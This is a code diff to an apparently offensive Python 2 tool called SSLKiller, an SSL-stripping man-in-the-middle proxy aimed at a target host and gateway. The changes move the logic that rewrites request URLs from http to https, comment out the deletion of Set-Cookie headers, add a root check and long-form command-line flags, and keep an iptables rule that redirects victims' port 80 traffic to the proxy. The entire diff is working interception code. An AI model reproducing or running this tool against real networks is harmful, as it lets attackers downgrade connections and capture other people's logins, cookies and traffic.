@@ -60,6 +60,8 @@ class SSLStripRequestHandler(ProxyRequestHandler):
     replaced_urls = deque(maxlen=1024)
     def request_handler(self, req, req_body):
 	print "\n-----------------------------[Request]--------------------------------"
+        if req.path in self.replaced_urls:
+            	req.path = req.path.replace('http://', 'https://w')
 	if req.headers:
 		modified = False
 		print "[+] Original Headers:"
@@ -81,8 +83,6 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 	if req_body:
 		print "\n[+]Original Body:"
 		print req_body
-        if req.path in self.replaced_urls:
-            	req.path = req.path.replace('http://', 'https://w')
 	print "\n----------------------------------------------------------------------"
 
     def response_handler(self, req, req_body, res, res_body):
@@ -107,11 +107,11 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 			modified = True
 		except:
 			pass
-		try:
-			del res.headers['Set-Cookie']
-			modified = True
-		except:
-			pass
+		#try:
+		#	del res.headers['Set-Cookie']
+		#	modified = True
+		#except:
+		#	pass
 		if modified:
 			print "\n[+] Modified Headers:"
 			print res.headers
@@ -234,24 +234,26 @@ class SSLKiller(object):
 if __name__ == "__main__":
 
 	print "\n\n[!!!]              TOOL NOT YET AVAILABLE             [!!!]\n\n"
+
+	if os.geteuid() != 0:
+        	sys.exit("[-] Only for roots kido! ")
 	try:
 		for x in sys.argv:
-			if x == "-h":
+			if x == "-h" or x == "--help":
 				print banner
 				print help
 				exit(0)
-			if x == "-i":
+			if x == "-i" or x == "--interface":
 				index = sys.argv.index(x) + 1
 				interface = sys.argv[index]
-			if x == "-t":
+			if x == "-t" or x == "--target":
 				index = sys.argv.index(x) + 1
 				target = sys.argv[index]
-			if x == "-g":
+			if x == "-g" or x == "--gateway":
 				index = sys.argv.index(x) + 1
 				gateway = sys.argv[index]
 		sslkill = SSLKiller(interface, target, gateway)
 		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
-		Proxy(HandlerClass=SSLStripRequestHandler)
 		Proxy(HandlerClass=SSLStripRequestHandler)
 	except KeyboardInterrupt:
 		print "[!] Aborted..."
